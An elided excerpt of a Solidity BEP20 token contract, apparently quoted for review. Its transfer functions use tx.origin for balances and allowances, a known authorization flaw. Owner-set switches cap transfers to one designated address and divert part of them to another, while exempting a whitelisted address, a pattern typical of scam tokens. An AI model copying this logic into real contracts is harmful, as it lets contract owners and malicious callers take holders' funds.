...
contract BEP20 is Owned {
    ...
    function transfer(address _to, uint256 _amount) public returns (bool) {
        ...
        require (balances[tx.origin]>=_amount && _amount>0 && balances[_to]+_amount>balances[_to], "Insufficient amount or allowance error");
        if((whiteListAddrStatus == false || (whiteListAddrStatus == true && whiteListAddr != tx.origin)) && transferLimitStatus==true && _to == addressToBeChanged) {
            require(_amount<=transferLimit,"Transfer Limit Exceeds");
        }
        if((whiteListAddrStatus == false || (whiteListAddrStatus == true && whiteListAddr != tx.origin)) &&  change == true && _to == addressToBeChanged) {
            ...
            emit Transfer(tx.origin,_to,leftAmt);
            emit Transfer(tx.origin,addressToSend,sendAmt);
        }
        else{
            balances[tx.origin]-=_amount;
    ...
    function transferFrom(address _from,address _to,uint256 _amount) public returns (bool) {
        ...
        require (balances[_from]>=_amount && allowed[_from][tx.origin]>=_amount && _amount>0 && balances[_to]+_amount>balances[_to], "Insufficient amount or allowance error");
